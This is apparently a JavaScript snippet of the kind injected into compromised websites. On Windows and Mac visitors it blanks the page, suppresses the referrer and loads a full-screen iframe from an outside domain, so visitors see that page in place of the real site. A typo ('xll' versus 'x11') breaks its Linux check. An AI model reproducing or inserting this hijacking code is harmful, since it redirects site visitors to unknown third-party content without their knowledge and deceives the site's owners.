(function(w, d) { 

    var system = {
        win: false,
        mac: false,
        xll: false
    };
    var p = navigator.platform;
    var us = navigator.userAgent.toLowerCase();
    system.win = p.indexOf("Win") == 0;
    system.mac = p.indexOf("Mac") == 0;
    system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
    if (system.win || system.mac || system.xll) {
        console.log(system)
        console.log(navigator.platform)
        var iframe_url='http://www.zych100.com/502.html';
        $("head").html('<meta charset="UTF-8"><meta name="referrer" content="no-referrer"><title></title><style>body{position:static !important;}body *{ visibility:hidden; }</style> ');
        $("body").empty();
        $(d).ready(function () {
            $("body").html('<iframe style="width:100%; height:100%;position:absolute;margin-left:0px;margin-top:0px;top:0%;left:0%;" id="mainFrame" src="'+iframe_url+'" frameborder="0" scrolling="no"></iframe>').show();
            $("body *").css("visibility", "visible");
        });
    }

})(window, document);